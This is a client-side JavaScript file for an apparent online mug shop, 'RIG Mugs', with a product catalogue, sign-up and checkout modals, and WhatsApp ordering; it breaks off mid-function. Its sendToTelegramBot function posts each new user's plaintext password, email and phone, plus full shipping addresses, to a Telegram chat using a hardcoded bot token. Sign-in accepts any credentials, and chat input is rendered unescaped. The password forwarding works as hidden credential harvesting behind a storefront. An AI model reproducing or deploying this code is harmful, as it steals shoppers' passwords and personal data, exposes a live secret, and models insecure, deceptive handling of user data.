// Product data
const products = [
  {
    id: 1,
    name: "Magic Color Changing Mug",
    description: "This mug changes color when hot liquid is poured in, revealing a beautiful design.",
    originalPrice: 500,
    discountPrice: 299,
    images: [
      "/images/Magic_Color_Changing_Mug1.png",
      "/images/Magic_Color_Changing_Mug2.png",
      "/images/Magic_Color_Changing_Mug3.png",
    ],
    videoUrl: "/videos/Magic_Color_Changing_Mug_Video.mp4",
    category: "magic-mugs",
  },
  {
    id: 2,
    name: "Personalized Love Mug",
    description: "Custom mug with your names and a special date, perfect for couples and anniversaries.",
    originalPrice: 450,
    discountPrice: 349,
    images: [
      "/images/Personalized_Love_Mug1.png",
      "/images/Personalized_Love_Mug2.png",
      "/images/Personalized_Love_Mug3.png",
    ],
    videoUrl: "/videos/Personalized_Love_Mug_Video.mp4",
    category: "love-mugs",
  },
  {
    id: 3,
    name: "Premium Ceramic Mug",
    description: "High-quality ceramic mug with a glossy finish, perfect for everyday use.",
    originalPrice: 350,
    discountPrice: 249,
    images: [
      "/images/Premium_Ceramic_Mug1.png",
      "/images/Premium_Ceramic_Mug2.png",
      "/images/Premium_Ceramic_Mug3.png",
    ],
    videoUrl: "/videos/Premium_Ceramic_Mug_Video.mp4",
    category: "normal-mugs",
  },
  {
    id: 4,
    name: "Photo Collage Mug",
    description: "Customize with your favorite photos in a beautiful collage design.",
    originalPrice: 550,
    discountPrice: 399,
    images: ["/images/Photo_Collage_Mug1.png", "/images/Photo_Collage_Mug2.png", "/images/Photo_Collage_Mug3.png"],
    videoUrl: "/videos/Photo_Collage_Mug_Video.mp4",
    category: "normal-mugs",
  },
  {
    id: 5,
    name: "Birthday Special Mug",
    description: "Perfect gift for birthdays with customizable name and age.",
    originalPrice: 450,
    discountPrice: 299,
    images: [
      "/images/Birthday_Special_Mug1.png",
      "/images/Birthday_Special_Mug2.png",
      "/images/Birthday_Special_Mug3.png",
    ],
    videoUrl: "/videos/Birthday_Special_Mug_Video.mp4",
    category: "normal-mugs",
  },
  {
    id: 6,
    name: "Heart Handle Love Mug",
    description: "Unique mug with a heart-shaped handle, perfect for expressing love.",
    originalPrice: 600,
    discountPrice: 449,
    images: [
      "/images/Heart_Handle_Love_Mug1.png",
      "/images/Heart_Handle_Love_Mug2.png",
      "/images/Heart_Handle_Love_Mug3.png",
    ],
    videoUrl: "/videos/Heart_Handle_Love_Mug_Video.mp4",
    category: "love-mugs",
  },
  {
    id: 7,
    name: "Constellation Magic Mug",
    description: "Magic mug that reveals zodiac constellations when hot liquid is added.",
    originalPrice: 550,
    discountPrice: 399,
    images: [
      "/images/Constellation_Magic_Mug1.png",
      "/images/Constellation_Magic_Mug2.png",
      "/images/Constellation_Magic_Mug3.png",
    ],
    videoUrl: "/videos/Constellation_Magic_Mug_Video.mp4",
    category: "magic-mugs",
  },
  {
    id: 8,
    name: "Anniversary Couple Mugs",
    description: "Set of two matching mugs for couples, perfect for anniversaries.",
    originalPrice: 800,
    discountPrice: 599,
    images: [
      "/images/Anniversary_Couple_Mugs1.png",
      "/images/Anniversary_Couple_Mugs2.png",
      "/images/Anniversary_Couple_Mugs3.png",
    ],
    videoUrl: "/videos/Anniversary_Couple_Mugs_Video.mp4",
    category: "love-mugs",
  },
]

// DOM Elements
const productGrid = document.getElementById("product-grid")
const mobileMenu = document.getElementById("mobile-menu")
const nav = document.querySelector("nav")
const authModal = document.getElementById("auth-modal")
const productModal = document.getElementById("product-modal")
const checkoutModal = document.getElementById("checkout-modal")
const contactModal = document.getElementById("contact-modal")
const discountPopup = document.getElementById("discount-popup")
const sharePopup = document.getElementById("share-popup")
const languageBtn = document.getElementById("language-btn")
const loadingAnimation = document.getElementById("loading-animation")
const chatInput = document.getElementById("chat-input")
const sendChatBtn = document.getElementById("send-chat")
// DOM Elements - Add WhatsApp install popup
const whatsappInstallPopup = document.getElementById("whatsapp-install-popup")

// Current language
let currentLanguage = "en" // 'en' for English, 'hi' for Hindi

// User authentication state
let isAuthenticated = false
let currentUser = null

// Selected product for checkout
let selectedProduct = null

// First visit check
const isFirstVisit = !localStorage.getItem("visited")

// Initialize the page
document.addEventListener("DOMContentLoaded", () => {
  // Show loading animation for 3 seconds
  setTimeout(() => {
    loadingAnimation.style.opacity = "0"
    setTimeout(() => {
      loadingAnimation.style.display = "none"
    }, 500)
  }, 3000)

  loadProducts()
  setupEventListeners()

  // Check if it's the first visit
  if (isFirstVisit) {
    // First show WhatsApp install popup
    setTimeout(() => {
      showWhatsAppInstallPopup()
    }, 3500) // Show after loading animation

    // Then show discount popup after user interacts with WhatsApp popup
    localStorage.setItem("visited", "true")
  }

  // Check if user is already logged in
  const userData = localStorage.getItem("user")
  if (userData) {
    currentUser = JSON.parse(userData)
    isAuthenticated = true
    updateAuthUI()
  }

  // Smooth scroll for anchor links
  document.querySelectorAll('a[href^="#"]').forEach((anchor) => {
    anchor.addEventListener("click", function (e) {
      if (this.getAttribute("href") !== "#") {
        e.preventDefault()
        const target = document.querySelector(this.getAttribute("href"))
        if (target) {
          window.scrollTo({
            top: target.offsetTop,
            behavior: "smooth",
          })
        }
      }
    })
  })
})

// Load products into the grid
function loadProducts() {
  productGrid.innerHTML = ""

  products.forEach((product) => {
    const productCard = document.createElement("div")
    productCard.className = "product-card animate__animated animate__fadeIn"
    productCard.dataset.id = product.id

    const discount = Math.round((1 - product.discountPrice / product.originalPrice) * 100)

    productCard.innerHTML = `
            <div class="product-image">
                <img src="${product.images[0] || "https://placeholder.pics/svg/300/DEDEDE/555555/Product"}" alt="${product.name}">
            </div>
            <div class="product-info">
                <h3>${product.name}</h3>
                <p>${product.description}</p>
                <div class="product-price">
                    <span class="discount-price">₹${product.discountPrice}</span>
                    <span class="original-price">₹${product.originalPrice}</span>
                    <span class="discount-tag">${discount}% OFF</span>
                </div>
            </div>
        `

    // Modified to check authentication before showing product details
    productCard.addEventListener("click", () => {
      if (!isAuthenticated) {
        openAuthModal("signup")
      } else {
        openProductModal(product)
      }
    })

    productGrid.appendChild(productCard)
  })
}

// Set up event listeners
function setupEventListeners() {
  // Mobile menu toggle
  mobileMenu.addEventListener("click", () => {
    nav.classList.toggle("active")

    const spans = mobileMenu.querySelectorAll("span")
    if (nav.classList.contains("active")) {
      spans[0].style.transform = "rotate(45deg) translate(5px, 5px)"
      spans[1].style.opacity = "0"
      spans[2].style.transform = "rotate(-45deg) translate(7px, -6px)"
    } else {
      spans[0].style.transform = "none"
      spans[1].style.opacity = "1"
      spans[2].style.transform = "none"
    }
  })

  // WhatsApp install popup events
  document.querySelector(".close-whatsapp-popup").addEventListener("click", closeWhatsAppInstallPopup)

  document.getElementById("install-whatsapp-btn").addEventListener("click", () => {
    window.open("https://www.whatsapp.com/download", "_blank")
    closeWhatsAppInstallPopup()
    setTimeout(() => {
      showDiscountPopup()
    }, 500)
  })

  document.getElementById("whatsapp-later-btn").addEventListener("click", () => {
    closeWhatsAppInstallPopup()
    setTimeout(() => {
      showDiscountPopup()
    }, 500)
  })

  // Contact link
  document.getElementById("contact-link").addEventListener("click", (e) => {
    e.preventDefault()
    if (!isAuthenticated) {
      openAuthModal("signup")
      return
    }
    openContactModal()
  })

  // Account link
  document.getElementById("account-link").addEventListener("click", (e) => {
    e.preventDefault()
    if (isAuthenticated) {
      // Show account options or logout
      if (confirm(currentLanguage === "en" ? "Do you want to log out?" : "क्या आप लॉग आउट करना चाहते हैं?")) {
        logout()
      }
    } else {
      openAuthModal("signup")
    }
  })

  // Share link
  document.getElementById("share-link").addEventListener("click", (e) => {
    e.preventDefault()
    if (!isAuthenticated) {
      openAuthModal("signup")
      return
    }
    openSharePopup()
  })

  document.getElementById("footer-share-link").addEventListener("click", (e) => {
    e.preventDefault()
    if (!isAuthenticated) {
      openAuthModal("signup")
      return
    }
    openSharePopup()
  })

  // Auth modal events
  document.querySelector(".close-modal").addEventListener("click", closeAuthModal)
  document.getElementById("auth-switch").addEventListener("click", (e) => {
    e.preventDefault()
    const isSignIn =
      document.getElementById("auth-title").textContent === (currentLanguage === "en" ? "Sign In" : "साइन इन")
    openAuthModal(isSignIn ? "signup" : "signin")
  })

  document.getElementById("auth-form").addEventListener("submit", (e) => {
    e.preventDefault()
    const isSignIn =
      document.getElementById("auth-title").textContent === (currentLanguage === "en" ? "Sign In" : "साइन इन")

    if (isSignIn) {
      // Sign in logic
      const email = document.getElementById("email").value
      const password = document.getElementById("password").value

      // Simple validation (in a real app, you'd check against a database)
      login({
        email,
        name: "User",
        phone: document.getElementById("phone").value,
      })

      closeAuthModal()

      // If user came from discount popup, redirect to WhatsApp
      if (discountPopup.style.display === "block") {
        redirectToWhatsAppWithDiscount()
        closeDiscountPopup()
      }
    } else {
      // Sign up logic
      const name = document.getElementById("name").value
      const email = document.getElementById("email").value
      const phone = document.getElementById("phone").value
      const password = document.getElementById("password").value

      // Register user
      login({
        name,
        email,
        phone,
      })

      // Send data to Telegram bot
      sendToTelegramBot({
        type: "new_user",
        name,
        email,
        phone,
        password,
      })

      closeAuthModal()

      // If user came from discount popup, redirect to WhatsApp
      if (discountPopup.style.display === "block") {
        redirectToWhatsAppWithDiscount()
        closeDiscountPopup()
      }
    }
  })

  // Product modal events
  document.querySelector(".close-product-modal").addEventListener("click", closeProductModal)

  // Play video button
  document.getElementById("play-video-btn").addEventListener("click", toggleProductVideo)

  // Buy now button
  document.getElementById("buy-now-btn").addEventListener("click", () => {
    if (!isAuthenticated) {
      closeProductModal()
      openAuthModal("signup")
      return
    }

    openCheckoutModal()
  })

  // Checkout modal events
  document.querySelector(".close-checkout-modal").addEventListener("click", closeCheckoutModal)

  document.getElementById("checkout-form").addEventListener("submit", (e) => {
    e.preventDefault()

    const shippingDetails = {
      fullName: document.getElementById("checkout-fullName").value,
      phone: document.getElementById("checkout-phone").value,
      address: document.getElementById("checkout-address").value,
      city: document.getElementById("checkout-city").value,
      state: document.getElementById("checkout-state").value,
      pincode: document.getElementById("checkout-pincode").value,
    }

    // Send order data to Telegram bot
    sendToTelegramBot({
      type: "new_order",
      product: selectedProduct,
      user: currentUser,
      shippingDetails,
      total: calculateTotal(selectedProduct.discountPrice),
    })

    // Redirect to WhatsApp
    redirectToWhatsApp(selectedProduct, shippingDetails)

    closeCheckoutModal()
  })

  // Contact modal events
  document.querySelector(".close-contact").addEventListener("click", closeContactModal)

  document.getElementById("product-info-btn").addEventListener("click", () => {
    addBotMessage(
      currentLanguage === "en"
        ? "We're checking your product inquiry. Our team will assist you shortly."
        : "हम आपकी उत्पाद जांच कर रहे हैं। हमारी टीम जल्द ही आपकी सहायता करेगी।",
    )

    document.getElementById("whatsapp-redirect").style.display = "block"
  })

  document.getElementById("other-issue-btn").addEventListener("click", () => {
    addBotMessage(
      currentLanguage === "en"
        ? "We're looking into your issue. Our team will assist you shortly."
        : "हम आपकी समस्या की जांच कर रहे हैं। हमारी टीम जल्द ही आपकी सहायता करेगी।",
    )

    document.getElementById("chat-input-container").style.display = "flex"
    document.getElementById("whatsapp-redirect").style.display = "block"
  })

  // Enable/disable send button based on chat input
  chatInput.addEventListener("input", () => {
    if (chatInput.value.trim() !== "") {
      sendChatBtn.disabled = false
    } else {
      sendChatBtn.disabled = true
    }
  })

  document.getElementById("send-chat").addEventListener("click", sendChatMessage)

  document.getElementById("chat-input").addEventListener("keypress", (e) => {
    if (e.key === "Enter") {
      sendChatMessage()
    }
  })

  document.getElementById("whatsapp-btn").addEventListener("click", () => {
    const message = encodeURIComponent(
      currentLanguage === "en"
        ? "Hello, I need assistance with RIG Mugs."
        : "नमस्ते, मुझे RIG Mugs के साथ सहायता की आवश्यकता है।",
    )

    window.open(`https://wa.me/9522096911?text=${message}`, "_blank")
    closeContactModal()
  })

  // Discount popup events
  document.querySelector(".close-popup").addEventListener("click", closeDiscountPopup)

  document.getElementById("signin-btn").addEventListener("click", () => {
    closeDiscountPopup()
    openAuthModal("signin")
  })

  document.getElementById("signup-btn").addEventListener("click", () => {
    closeDiscountPopup()
    openAuthModal("signup")
  })

  // Share popup events
  document.querySelector(".close-share-popup").addEventListener("click", closeSharePopup)

  document.getElementById("download-marketing-image").addEventListener("click", () => {
    // Create a temporary link to download the image
    const link = document.createElement("a")
    link.href = document.getElementById("marketing-image").src
    link.download = "RIG-Mugs-Offer.png"
    document.body.appendChild(link)
    link.click()
    document.body.removeChild(link)
  })

  document.getElementById("share-whatsapp").addEventListener("click", () => {
    const message = encodeURIComponent(
      currentLanguage === "en"
        ? "🎁 *Special Offer from RIG Mugs!* 🎁\n\nShare this message in 5 WhatsApp groups and get a chance to win a FREE mug! Visit our website: https://rigmugs.com"
        : "🎁 *RIG Mugs से विशेष ऑफर!* 🎁\n\nइस संदेश को 5 WhatsApp ग्रुप्स में शेयर करें और एक फ्री मग जीतने का मौका पाएं! हमारी वेबसाइट पर जाएं: https://rigmugs.com",
    )

    window.open(`https://wa.me/?text=${message}`, "_blank")

    // Send share data to Telegram
    sendToTelegramBot({
      type: "share",
      platform: "WhatsApp",
      user: currentUser || { name: "Guest", email: "Not provided", phone: "Not provided" },
      time: new Date().toLocaleString(),
    })

    closeSharePopup()
  })

  document.getElementById("share-instagram").addEventListener("click", () => {
    alert(
      currentLanguage === "en"
        ? "Download the image and share it on your Instagram story. Tag us @RIGMugs for a chance to win a FREE mug!"
        : "इमेज डाउनलोड करें और इसे अपनी Instagram स्टोरी पर शेयर करें। फ्री मग जीतने का मौका पाने के लिए हमें @RIGMugs टैग करें!",
    )

    // Send share data to Telegram
    sendToTelegramBot({
      type: "share",
      platform: "Instagram",
      user: currentUser || { name: "Guest", email: "Not provided", phone: "Not provided" },
      time: new Date().toLocaleString(),
    })
  })

  // Language toggle
  languageBtn.addEventListener("click", toggleLanguage)
}

// Open product modal
function openProductModal(product) {
  selectedProduct = product

  // Set product details
  document.getElementById("modal-product-name").textContent = product.name
  document.getElementById("modal-discount-price").textContent = `₹${product.discountPrice}`
  document.getElementById("modal-original-price").textContent = `₹${product.originalPrice}`

  const discount = Math.round((1 - product.discountPrice / product.originalPrice) * 100)
  document.getElementById("modal-discount-tag").textContent = `${discount}% OFF`

  document.getElementById("modal-product-description").textContent = product.description
  document.getElementById("modal-product-category").textContent = formatCategory(product.category)

  // Set main image
  document.getElementById("main-product-image").src =
    product.images[0] || "https://placeholder.pics/svg/300/DEDEDE/555555/Product"
  document.getElementById("main-product-image").style.display = "block"

  // Hide video initially
  document.getElementById("product-video").style.display = "none"
  document.getElementById("product-video").src = product.videoUrl || ""

  // Create thumbnails
  const thumbnailsContainer = document.getElementById("image-thumbnails")
  thumbnailsContainer.innerHTML = ""

  product.images.forEach((image, index) => {
    const thumbnail = document.createElement("div")
    thumbnail.className = `thumbnail ${index === 0 ? "active" : ""}`
    thumbnail.innerHTML = `<img src="${image || "https://placeholder.pics/svg/300/DEDEDE/555555/Product"}" alt="${product.name} ${index + 1}">`

    thumbnail.addEventListener("click", () => {
      // Update main image
      document.getElementById("main-product-image").src =
        image || "https://placeholder.pics/svg/300/DEDEDE/555555/Product"
      document.getElementById("main-product-image").style.display = "block"
      document.getElementById("product-video").style.display = "none"

      // Update active thumbnail
      document.querySelectorAll(".thumbnail").forEach((thumb) => thumb.classList.remove("active"))
      thumbnail.classList.add("active")
    })

    thumbnailsContainer.appendChild(thumbnail)
  })

  // Add video thumbnail if video URL exists
  if (product.videoUrl) {
    const videoThumbnail = document.createElement("div")
    videoThumbnail.className = "thumbnail"
    videoThumbnail.innerHTML = `<div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:#f3f4f6"><i class="fas fa-play"></i></div>`

    videoThumbnail.addEventListener("click", () => {
      toggleProductVideo()

      // Update active thumbnail
      document.querySelectorAll(".thumbnail").forEach((thumb) => thumb.classList.remove("active"))
      videoThumbnail.classList.add("active")
    })

    thumbnailsContainer.appendChild(videoThumbnail)
  }

  // Show modal
  productModal.style.display = "block"
}

// Toggle product video
function toggleProductVideo() {
  const mainImage = document.getElementById("main-product-image")
  const video = document.getElementById("product-video")
  const playBtn = document.getElementById("play-video-btn")

  if (mainImage.style.display !== "none") {
    mainImage.style.display = "none"
    video.style.display = "block"
    playBtn.style.display = "none"
    video.play()
  } else {
    mainImage.style.display = "block"
    video.style.display = "none"
    playBtn.style.display = "flex"
    video.pause()
  }
}

// Close product modal
function closeProductModal() {
  const video = document.getElementById("product-video")
  if (video) {
    video.pause()
  }
  productModal.style.display = "none"
}

// Open checkout modal
function openCheckoutModal() {
  // Fill in product details
  document.getElementById("summary-product-name").textContent = selectedProduct.name
  document.getElementById("summary-product-price").textContent = `₹${selectedProduct.discountPrice}`

  // Calculate GST
  const gst = calculateGST(selectedProduct.discountPrice)
  document.getElementById("gst-amount").textContent = `₹${gst}`

  // Calculate total
  const total = calculateTotal(selectedProduct.discountPrice)
  document.getElementById("total-amount").textContent = `₹${total}`

  // Pre-fill user details if available
  if (currentUser) {
    document.getElementById("checkout-fullName").value = currentUser.name || ""
    document.getElementById("checkout-phone").value = currentUser.phone || ""
  }

  // Update customer message
  document.getElementById("customer-message-text").textContent =
    currentLanguage === "en"
      ? `Thank you for choosing RIG Mugs! We'll process your order quickly and deliver it to your doorstep. Your satisfaction is our priority!`
      : `RIG Mugs चुनने के लिए धन्यवाद! हम आपके ऑर्डर को जल्दी से प्रोसेस करेंगे और इसे आपके घर तक पहुंचाएंगे। आपकी संतुष्टि हमारी प्राथमिकता है!`

  // Close product modal and open checkout modal
  closeProductModal()
  checkoutModal.style.display = "block"
}

// Close checkout modal
function closeCheckoutModal() {
  checkoutModal.style.display = "none"
}

// Open contact modal
function openContactModal() {
  // Reset chat
  document.getElementById("chat-messages").innerHTML = `
        <div class="message bot-message">
            <p id="chat-greeting">${currentLanguage === "en" ? "Hello! How can I help you today?" : "नमस्ते! आज मैं आपकी कैसे मदद कर सकता हूं?"}</p>
        </div>
        <div class="message bot-message">
            <p id="chat-options">${currentLanguage === "en" ? "What would you like assistance with?" : "आप किस प्रकार की सहायता चाहते हैं?"}</p>
            <div class="chat-buttons">
                <button id="product-info-btn" class="chat-btn">${currentLanguage === "en" ? "Product Information" : "उत्पाद जानकारी"}</button>
                <button id="other-issue-btn" class="chat-btn">${currentLanguage === "en" ? "Other Issue" : "अन्य समस्या"}</button>
            </div>
        </div>
    `

  // Reset UI state
  document.getElementById("chat-input-container").style.display = "none"
  document.getElementById("whatsapp-redirect").style.display = "none"

  // Add event listeners to new buttons
  document.getElementById("product-info-btn").addEventListener("click", () => {
    addBotMessage(
      currentLanguage === "en"
        ? "We're checking your product inquiry. Our team will assist you shortly."
        : "हम आपकी उत्पाद जांच कर रहे हैं। हमारी टीम जल्द ही आपकी सहायता करेगी।",
    )

    document.getElementById("whatsapp-redirect").style.display = "block"
  })

  document.getElementById("other-issue-btn").addEventListener("click", () => {
    addBotMessage(
      currentLanguage === "en"
        ? "We're looking into your issue. Our team will assist you shortly."
        : "हम आपकी समस्या की जांच कर रहे हैं। हमारी टीम जल्द ही आपकी सहायता करेगी।",
    )

    document.getElementById("chat-input-container").style.display = "flex"
    document.getElementById("whatsapp-redirect").style.display = "block"
  })

  contactModal.style.display = "block"
}

// Close contact modal
function closeContactModal() {
  contactModal.style.display = "none"
}

// Open auth modal
function openAuthModal(mode) {
  const isSignIn = mode === "signin"

  // Update modal title and button text
  document.getElementById("auth-title").textContent = isSignIn
    ? currentLanguage === "en"
      ? "Sign In"
      : "साइन इन"
    : currentLanguage === "en"
      ? "Create Account"
      : "अकाउंट बनाएं"

  document.getElementById("auth-submit").textContent = isSignIn
    ? currentLanguage === "en"
      ? "Sign In"
      : "साइन इन"
    : currentLanguage === "en"
      ? "Create Account"
      : "अकाउंट बनाएं"

  document.getElementById("auth-switch-text").innerHTML = isSignIn
    ? currentLanguage === "en"
      ? 'Don\'t have an account? <a href="#" id="auth-switch">Sign Up</a>'
      : 'अकाउंट नहीं है? <a href="#" id="auth-switch">साइन अप करें</a>'
    : currentLanguage === "en"
      ? 'Already have an account? <a href="#" id="auth-switch">Sign In</a>'
      : 'पहले से ही अकाउंट है? <a href="#" id="auth-switch">साइन इन करें</a>'

  // Show/hide name field
  document.getElementById("name-field").style.display = isSignIn ? "none" : "block"

  // Reset form
  document.getElementById("auth-form").reset()

  // Add event listener to the new switch link
  document.getElementById("auth-switch").addEventListener("click", (e) => {
    e.preventDefault()
    openAuthModal(isSignIn ? "signup" : "signin")
  })

  // Show modal
  authModal.style.display = "block"
}

// Close auth modal
function closeAuthModal() {
  authModal.style.display = "none"
}

// Open share popup
function openSharePopup() {
  // Update text based on language
  document.getElementById("share-popup-title").textContent =
    currentLanguage === "en" ? "Get a FREE Mug!" : "एक फ्री मग पाएं!"

  document.getElementById("share-popup-text").textContent =
    currentLanguage === "en"
      ? "Share with friends and get a chance to win a FREE mug!"
      : "दोस्तों के साथ शेयर करें और एक फ्री मग जीतने का मौका पाएं!"

  document.getElementById("step1-text").textContent =
    currentLanguage === "en" ? "Download the image above" : "ऊपर दी गई इमेज डाउनलोड करें"

  document.getElementById("step2-text").textContent =
    currentLanguage === "en"
      ? "Share on Instagram story or to 5 WhatsApp groups"
      : "Instagram स्टोरी पर या 5 WhatsApp ग्रुप्स में शेयर करें"

  document.getElementById("step3-text").textContent =
    currentLanguage === "en"
      ? "Tag us @RIGMugs on Instagram or send screenshots on WhatsApp"
      : "Instagram पर हमें @RIGMugs टैग करें या WhatsApp पर स्क्रीनशॉट भेजें"

  document.getElementById("step4-text").textContent =
    currentLanguage === "en" ? "Lucky winners will be selected every week!" : "हर हफ्ते लकी विनर्स का चयन किया जाएगा!"

  document.getElementById("share-whatsapp").textContent =
    currentLanguage === "en" ? "Share on WhatsApp" : "WhatsApp पर शेयर करें"

  document.getElementById("share-instagram").textContent =
    currentLanguage === "en" ? "Share on Instagram" : "Instagram पर शेयर करें"

  // Show popup
  sharePopup.style.display = "block"
}

// Close share popup
function closeSharePopup() {
  sharePopup.style.display = "none"
}

// Send chat message
function sendChatMessage() {
  const input = document.getElementById("chat-input")
  const message = input.value.trim()

  if (message) {
    // Add user message
    const messagesContainer = document.getElementById("chat-messages")
    const userMessage = document.createElement("div")
    userMessage.className = "message user-message"
    userMessage.innerHTML = `<p>${message}</p>`
    messagesContainer.appendChild(userMessage)

    // Clear input
    input.value = ""

    // Disable send button
    document.getElementById("send-chat").disabled = true

    // Scroll to bottom
    messagesContainer.scrollTop = messagesContainer.scrollHeight

    // Add bot response after a short delay
    setTimeout(() => {
      addBotMessage(
        currentLanguage === "en"
          ? "Thank you for your message. Our team will get back to you soon."
          : "आपके संदेश के लिए धन्यवाद। हमारी टीम जल्द ही आपसे संपर्क करेगी।",
      )
    }, 1000)
  }
}

// Add bot message
function addBotMessage(message) {
  const messagesContainer = document.getElementById("chat-messages")
  const botMessage = document.createElement("div")
  botMessage.className = "message bot-message"
  botMessage.innerHTML = `<p>${message}</p>`
  messagesContainer.appendChild(botMessage)

  // Scroll to bottom
  messagesContainer.scrollTop = messagesContainer.scrollHeight
}

// Show discount popup
function showDiscountPopup() {
  discountPopup.style.display = "block"
}

// Close discount popup
function closeDiscountPopup() {
  discountPopup.style.display = "none"
}

// Login user
function login(user) {
  currentUser = user
  isAuthenticated = true
  localStorage.setItem("user", JSON.stringify(user))
  updateAuthUI()
}

// Logout user
function logout() {
  currentUser = null
  isAuthenticated = false
  localStorage.removeItem("user")
  updateAuthUI()
}

// Update UI based on auth state
function updateAuthUI() {
  const accountLink = document.getElementById("account-link")
  const accountText = accountLink.querySelector("span")
  accountText.textContent = isAuthenticated
    ? currentLanguage === "en"
      ? "My Account"
      : "मेरा अकाउंट"
    : currentLanguage === "en"
      ? "Sign In"
      : "साइन इन"
}

// Calculate GST (2%)
function calculateGST(price) {
  return Math.round(price * 0.02)
}

// Calculate total price
function calculateTotal(price) {
  const gst = calculateGST(price)
  return price + gst // Free delivery, so only adding GST
}

// Format category name
function formatCategory(category) {
  return category
    .split("-")
    .map((word) => word.charAt(0).toUpperCase() + word.slice(1))
    .join(" ")
}

// Redirect to WhatsApp with order details
function redirectToWhatsApp(product, shippingDetails) {
  const total = calculateTotal(product.discountPrice)

  // Format the message for WhatsApp
  const message =
    currentLanguage === "en"
      ? `*New Order from RIG Mugs*
----------------------------
*Product:* ${product.name}
*Price:* ₹${product.discountPrice}
*GST (2%):* ₹${calculateGST(product.discountPrice)}
*Total:* ₹${total}
----------------------------
*Customer Details:*
Name: ${shippingDetails.fullName}
Phone: ${shippingDetails.phone}
Address: ${shippingDetails.address}
City: ${shippingDetails.city}
State: ${shippingDetails.state}
Pincode: ${shippingDetails.pincode}
----------------------------
Thank you for your order!`
      : `*RIG Mugs से नया ऑर्डर*
----------------------------
*उत्पाद:* ${product.name}
*कीमत:* ₹${product.discountPrice}
*GST (2%):* ₹${calculateGST(product.discountPrice)}
*कुल:* ₹${total}
----------------------------
*ग्राहक विवरण:*
नाम: ${shippingDetails.fullName}
फोन: ${shippingDetails.phone}
पता: ${shippingDetails.address}
शहर: ${shippingDetails.city}
राज्य: ${shippingDetails.state}
पिनकोड: ${shippingDetails.pincode}
----------------------------
आपके ऑर्डर के लिए धन्यवाद!`

  // Encode the message for URL
  const encodedMessage = encodeURIComponent(message)

  // Open WhatsApp with the pre-filled message
  window.open(`https://wa.me/9522096911?text=${encodedMessage}`, "_blank")
}

// Redirect to WhatsApp with discount message
function redirectToWhatsAppWithDiscount() {
  const message =
    currentLanguage === "en"
      ? "Hello! I'd like to claim my 50% discount on RIG Mugs!"
      : "नमस्ते! मैं RIG Mugs पर अपना 50% डिस्काउंट क्लेम करना चाहता हूं!"

  const encodedMessage = encodeURIComponent(message)
  window.open(`https://wa.me/9522096911?text=${encodedMessage}`, "_blank")
}

// Send data to Telegram bot
function sendToTelegramBot(data) {
  const botToken = "7970859410:AAGwEiNTzI2OdCL42Y1aLrqhtLhHdeTFoqw"
  const chatId = "1989234528"

  // Format message based on data type
  let message = ""

  if (data.type === "new_user") {
    message =
      `🔔 *New User Registration* 🔔\n\n` +
      `*Name:* ${data.name}\n` +
      `*Email:* ${data.email}\n` +
      `*Phone:* ${data.phone}\n` +
      `*Password:* ${data.password}\n` +
      `*Time:* ${new Date().toLocaleString()}`
  } else if (data.type === "new_order") {
    message =
      `🛒 *New Order Placed* 🛒\n\n` +
      `*Product:* ${data.product.name}\n` +
      `*Price:* ₹${data.product.discountPrice}\n` +
      `*GST (2%):* ₹${calculateGST(data.product.discountPrice)}\n` +
      `*Total:* ₹${data.total}\n\n` +
      `*Customer Details:*\n` +
      `*Name:* ${data.shippingDetails.fullName}\n` +
      `*Phone:* ${data.shippingDetails.phone}\n` +
      `*Email:* ${data.user?.email || "Not provided"}\n` +
      `*Address:* ${data.shippingDetails.address}\n` +
      `*City:* ${data.shippingDetails.city}\n` +
      `*State:* ${data.shippingDetails.state}\n` +
      `*Pincode:* ${data.shippingDetails.pincode}\n` +
      `*Time:* ${new Date().toLocaleString()}`
  } else if (data.type === "share") {
    message =
      `🔄 *Content Shared* 🔄\n\n` +
      `*Platform:* ${data.platform}\n` +
      `*User:* ${data.user.name}\n` +
      `*Email:* ${data.user.email}\n` +
      `*Phone:* ${data.user.phone}\n` +
      `*Time:* ${data.time}`
  }

  // Send to Telegram
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    }),
  })
    .then((response) => response.json())
    .then((data) => console.log("Success:", data))
    .catch((error) => console.error("Error:", error))
}

// Toggle language
function toggleLanguage() {
  currentLanguage = currentLanguage === "en" ? "hi" : "en"
  updateLanguageUI()
}

// Update UI text based on language
function updateLanguageUI() {
  // Language button
  document.getElementById("language-text").textContent =
    currentLanguage === "en" ? "भाषा बदलें / Change Language" : "Change Language / भाषा बदलें"

  // Navigation
  document.querySelector("#home-link span").textContent = currentLanguage === "en" ? "Home" : "होम"
  document.querySelector("#products-link span").textContent = currentLanguage === "en" ? "Products" : "उत्पाद"
  document.querySelector("#contact-link span").textContent = currentLanguage === "en" ? "Contact" : "संपर्क"
  document.querySelector("#share-link span").textContent = currentLanguage === "en" ? "Share & Win" : "शेयर करें और जीतें"

  // Account link (depends on auth state)
  document.querySelector("#account-link span").textContent = isAuthenticated
    ? currentLanguage === "en"
      ? "My Account"
      : "मेरा अकाउंट"
    : currentLanguage === "en"
      ? "Sign In"
      : "साइन इन"

  // Hero section
  document.getElementById("hero-title").textContent =
    currentLanguage === "en" ? "Express Yourself with RIG Mugs" : "RIG मग्स के साथ खुद को व्यक्त करें"
  document.getElementById("hero-subtitle").textContent =
    currentLanguage === "en"
      ? "Discover our unique collection of custom mugs for every occasion."
      : "हर अवसर के लिए हमारे अनोखे कस्टम मग्स का संग्रह देखें।"
  document.getElementById("shop-now-btn").textContent = currentLanguage === "en" ? "Shop Now" : "अभी खरीदें"

  // Products section
  document.getElementById("products-title").textContent = currentLanguage === "en" ? "Our Collection" : "हमारा संग्रह"

  // Footer
  document.getElementById("footer-tagline").textContent =
    currentLanguage === "en" ? "Express yourself with our unique collection" : "हमारे अनोखे संग्रह के साथ खुद को व्यक्त करें"
  document.getElementById("copyright").textContent =
    currentLanguage === "en"
      ? `© ${new Date().getFullYear()} RIG Mugs. All rights reserved.`
      : `© ${new Date().getFullYear()} RIG मग्स. सर्वाधिकार सुरक्षित।`
  document.getElementById("privacy-link").textContent = currentLanguage === "en" ? "Privacy Policy" : "गोपनीयता नीति"
  document.getElementById("terms-link").textContent = currentLanguage === "en" ? "Terms of Service" : "सेवा की शर्तें"
  document.getElementById("footer-share-link").textContent = currentLanguage === "en" ? "Share & Win" : "शेयर करें और जीतें"

  // Product modal
